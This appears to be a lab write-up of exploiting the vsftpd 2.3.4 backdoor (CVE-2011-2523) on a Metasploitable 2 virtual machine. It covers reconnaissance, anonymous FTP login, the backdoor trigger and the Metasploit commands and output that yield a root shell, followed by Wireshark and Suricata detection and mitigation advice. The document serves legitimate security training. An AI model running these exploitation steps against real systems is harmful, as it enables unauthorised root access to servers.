# Metasploitable 2 — Vulnerability #2
## vsftpd 2.3.4 — Anonymous Login & Backdoor Command Execution

**Date:** 2026-03-20  
**Target:** 192.168.56.109  
**Attacker:** 192.168.56.110 (Kali Linux)

---

## 1. Background & Research

Before beginning the practical exercise, research was conducted on vsftpd 2.3.4 to understand the vulnerability's history and technical details.

### The Story

vsftpd (Very Secure FTP Daemon) is a widely used FTP server for Unix-like systems. In July 2011, an unknown attacker compromised the vsftpd project's source code repository and injected malicious backdoor code into version 2.3.4. This is a classic **supply chain attack**  rather than attacking end users directly, the attacker poisoned the software at its source. Any server that downloaded and installed vsftpd 2.3.4 from the official distribution site during the affected window unknowingly installed a backdoor giving attackers instant root access.

The malicious code was discovered and removed relatively quickly, but Metasploitable 2 intentionally ships with this backdoored version for educational purposes.

### CVE Reference

- **CVE-2011-2523**  vsftpd 2.3.4 backdoor command execution
- **CVSS Score:** 10.0 (Critical)
- **Disclosure Date:** July 3, 2011

### Two Vulnerabilities Identified

Research revealed two distinct vulnerabilities in this vsftpd installation:

1. **Anonymous Login Enabled**  The FTP service allows unauthenticated anonymous access. An attacker can log in without any credentials using the username `anonymous`. If the FTP service runs with elevated privileges, this allows unauthorised file upload, download, and modification of server contents.

2. **Backdoor Command Execution (CVE-2011-2523)**  The backdoor is triggered by a specific pattern in the FTP username. When a user logs in with a username ending in `:)`, the server detects these two characters and secretly opens a bind shell on **port 6200**. An attacker can then connect to that port and receive a root command prompt full system control with no password required. Because the FTP service runs as root on this system, the resulting shell inherits root privileges immediately.

---

## 2. Reconnaissance

Service discovery was performed using Nmap with version detection enabled, targeting port 21 specifically.

```bash
nmap -sV -p 21 192.168.56.109
```

**Result:**
```
21/tcp  open  ftp  vsftpd 2.3.4
```

Nmap confirmed port 21 is open and identified the exact service version as vsftpd 2.3.4  the backdoored version. This version banner is sufficient to identify the vulnerability without further probing.

---

## 3. Vulnerability Identification — Searchsploit

Searchsploit was used to search the local Exploit-DB database for known vulnerabilities in vsftpd 2.3.4. Searchsploit allows offline searching of public exploits  an important methodology step before moving to automated frameworks.

```bash
searchsploit vsftpd 2.3.4
```

**Result:**
```
vsftpd 2.3.4 - Backdoor Command Execution  |  unix/remote/17491.rb
```

Searchsploit confirmed a public exploit exists for this exact version. The `.rb` extension indicates a Metasploit module, which was used in the exploitation phase.

---

## 4. Finding #1 — Anonymous FTP Login

Before exploiting the backdoor, the anonymous login misconfiguration was tested and documented as a separate finding.

```bash
ftp 192.168.56.109
Username: anonymous
Password: [blank]
```

Login was successful, confirming unauthenticated access to the FTP server. Wireshark traffic capture confirmed the anonymous credentials were transmitted in **plaintext** over the network, a secondary finding demonstrating that FTP provides no encryption for credentials.

---

## 5. Exploitation — vsftpd Backdoor

The backdoor was exploited using the Metasploit Framework module identified via Searchsploit.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.109
exploit
```

**Exploit output:**
```
[*] 192.168.56.109:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.109:21 - USER: 331 Please specify the password
[+] 192.168.56.109:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.109:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.110:42929 -> 192.168.56.109:6200)
```

**Verification:**
```bash
whoami
root
```

Root access was obtained immediately upon exploitation. No privilege escalation was required because the vsftpd service was running as root. The backdoor shell opened on port 6200 as expected.

---

## 6. Detection

Throughout the exercise, traffic was monitored using Wireshark on the Kali attacker machine and Suricata IDS running on Security Onion.

### Wireshark

Wireshark captured the full network conversation using the filter:

```
ip.addr == 192.168.56.109 && ftp
```

The TCP stream follow feature revealed the complete exchange  the vsFTPd 2.3.4 banner, the anonymous login credentials in plaintext, and the backdoor trigger sequence. Wireshark proved highly effective at capturing both the anonymous login and exploit traffic in full detail.

### Security Onion / Suricata

Security Onion running Suricata IDS generated alerts at three stages of the attack. While the screenshots may appear similar at first glance, examining them closely reveals distinct differences:

1. **nmap_traffic** — No alert was generated. Suricata logged the connection as TCP communication from an external IP showing reconnaissance activity was captured at network level but did not trigger a signature alert.

2. **anon_login** — Suricata identified and logged a direct FTP session connection, specifying the FTP service on port 21. The protocol was correctly identified.

3. **exploit_traffic** — A full Suricata alert was generated. Notably, Suricata correctly identified the attacker machine hostname as **Kali**  matching the actual attacker. This demonstrates that even before exploitation, the presence of a Kali Linux machine on the network was flagged via DHCP hostname detection (signature: `ET INFO Possible Kali Linux hostname in DHCP Request Packet`).

> **Note on Security Onion limitations:** Security Onion in this setup uses Suricata as its primary IDS engine rather than Zeek, so FTP-specific protocol logging (such as username/command visibility) was not available via the ftp.log file. Network-level connection metadata was captured through Zeek's conn.log. For deeper FTP protocol inspection, additional Zeek configuration would be required  this represents a potential improvement for future lab iterations.

---

## 7. Mitigation

### Backdoor (CVE-2011-2523)

- **Upgrade vsftpd immediately** to a version that is not affected by this backdoor (any version after 2.3.4 from the official clean source)
- **Verify software integrity** — always check checksums (SHA256/MD5) of downloaded software against official hashes before installation
- **Monitor for port 6200** — any connection to or from port 6200 should trigger an immediate alert as this is the backdoor's hardcoded port
- **Run services with least privilege** — FTP service should never run as root. A compromised FTP service should not result in system-wide root access

### Anonymous Login

- **Disable anonymous FTP access** unless explicitly required by business need. In vsftpd.conf set:
```
anonymous_enable=NO
```
- **Replace FTP with SFTP** — FTP transmits all data including credentials in plaintext. SFTP (SSH File Transfer Protocol) provides encrypted transport and should be used instead
- **Network segmentation** — FTP services should not be directly accessible from untrusted networks. Firewall rules should restrict access to authorised IP ranges only

---

## 8. Today's Goal

Today's objective was to exploit and document the vsftpd 2.3.4 vulnerability on Metasploitable 2. Both vulnerabilities  anonymous FTP login and the backdoor command execution  were successfully demonstrated and captured with supporting evidence from Wireshark and Security Onion. The full attack chain from service discovery through exploitation and detection was documented following the same methodology established in Vulnerability #1 (UnrealIRCd).

**Tools used in this exercise:**
- Nmap — service and version discovery
- Searchsploit — offline exploit database search
- Metasploit Framework — exploitation
- Wireshark — network traffic capture and analysis
- Security Onion (Suricata) — IDS alerting and network monitoring

---


